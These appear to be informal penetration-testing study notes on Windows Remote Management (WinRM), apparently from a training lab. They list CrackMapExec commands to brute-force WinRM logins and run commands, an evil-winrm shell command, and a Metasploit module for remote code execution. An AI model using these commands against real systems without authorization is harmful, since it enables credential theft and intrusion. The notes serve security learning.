windows remote management protol that allows you to remotely administer windows computers over HTTP / HTTPS

Used in the following ways

 - remotely access and interact with windows hosts on local network
 - remotely access and execute commands
 - manage and configured windows systems remotely

Runs on ports 5985 and 5986 (HTTPS)

Implements access control through various forms (username and password or pwhash)

Crackmapexec can bruteforce winrm to identify users and passwords as well as execute commands on the target system.

We can also use a ruby script called "evil-winrm" to obtain the command shell.

**nmap**

WinRM is not in the 1000 most commonly used, so you must manually include TCP 5985 and 5986

**CrackMapExec**

https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

Can be used for mssql, smb, winrm, and SSH

example:
crackmapexec winrm ip.addr -u username -p passwordlist.txt 

once you have cred syou can run cmds

crackmapexec winrm ip.addr -u username -p password -x "systeminfo"

**Evil-WinRM**

evil-winrm.rb -u username -p password -i ip.addr

*RCE*

**MetaSploit**

exploit/windows/winrm/winrm_script_exec

In the lab they want to ser force VBS to true although it is not required to run by default.



